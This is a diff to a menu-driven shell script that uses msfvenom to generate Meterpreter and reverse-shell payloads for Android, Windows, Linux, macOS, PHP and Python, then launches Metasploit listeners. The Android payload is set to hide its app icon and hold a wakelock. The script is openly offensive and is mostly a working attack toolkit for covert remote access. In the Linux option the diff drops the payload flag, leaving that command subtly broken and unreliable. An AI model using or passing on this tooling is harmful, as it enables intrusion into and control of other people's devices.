@@ -56,56 +56,56 @@ if [ $ask_start = 'y' ]; then
    echo 'Choose Your Option :'
    read co
    if [ $co = '1' ]; then
-      echo 'Creating Payload'
+      echo 'Creating Payload...'
       msfvenom -p android/meterpreter/reverse_tcp AndroidHideAppIcon=true AndroidMeterpreterDebug=true AndroidWakelock=true lhost=$ip lport=$port -o /$pn
       echo 'Payload Created'
       echo 'Do You Want To Start Listener?'
         echo 'y/n'
         read start_listener
         if [ $start_listener = 'y' ]; then
-           msfvenom -q -x 'use exploit/multi/handler;
+           msfconsole -q -x 'use exploit/multi/handler;
            set payload android/meterpreter/reverse_tcp;
            set lhost $ip;
            set lport $port;
            exploit'
         fi
    elif [ $co = '2' ]; then
-        echo 'Creating Payload'
+        echo 'Creating Payload...'
         msfvenom -p windows/meterpreter/reverse_tcp lhost=$ip lport=$port -o /$pn
         echo 'Payload Created'
         echo 'Do You Want To Start Listener?'
         echo 'y/n'
         read start_listener
         if [ $start_listener = 'y' ]; then
-           msfvenom -q -x 'use exploit/multi/handler;
+           msfconsole -q -x 'use exploit/multi/handler;
            set payload windows/meterpreter/reverse_tcp;
            set lhost $ip;
            set lport $port;
            exploit'
         fi
    elif [ $co = '3' ]; then
-        echo 'Creating Payload'
-        msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=$ip lport=$port -o /$pn
+        echo 'Creating Payload...'
+        msfvenom linux/x86/meterpreter/reverse_tcp lhost=$ip lport=$port -o /$pn
         echo 'Payload Created'
         echo 'Do You Want To Start Listener?'
         echo 'y/n'
         read start_listener
         if [ $start_listener = 'y' ]; then
-           msfvenom -q -x 'use exploit/multi/handler;
+           msfconsole -q -x 'use exploit/multi/handler;
            set payload linux/x86/meterpreter/reverse_tcp;
            set lhost $ip;
            set lport $port;
            exploit'
         fi
    elif [ $co = '4' ]; then
-        echo 'Creating Payload'
+        echo 'Creating Payload...'
         msfvenom -p osx/x86/shell_reverse_tcp lhost=$ip lport=$port -o /$pn
         echo 'Payload Created'
         echo 'Do You Want To Start Listener?'
         echo 'y/n'
         read start_listener
         if [ $start_listener = 'y' ]; then
-           msfvenom -q -x 'use exploit/multi/handler;
+           msfconsole -q -x 'use exploit/multi/handler;
            set payload osx/x86/shell_reverse_tcp;
            set lhost $ip;
            set lport $port;
@@ -119,7 +119,7 @@ if [ $ask_start = 'y' ]; then
         echo 'y/n'
         read start_listener
         if [ $start_listener = 'y' ]; then
-           msfvenom -q -x 'use exploit/multi/handler;
+           msfconsole -q -x 'use exploit/multi/handler;
            set payload php/meterpreter/reverse_tcp;
            set lhost $ip;
            set lport $port;
@@ -133,7 +133,7 @@ if [ $ask_start = 'y' ]; then
         echo 'y/n'
         read start_listener
         if [ $start_listener = 'y' ]; then
-           msfvenom -q -x 'use exploit/multi/handler;
+           msfconsole -q -x 'use exploit/multi/handler;
            set payload python/meterpreter/reverse_tcp;
            set lhost $ip;
            set lport $port;
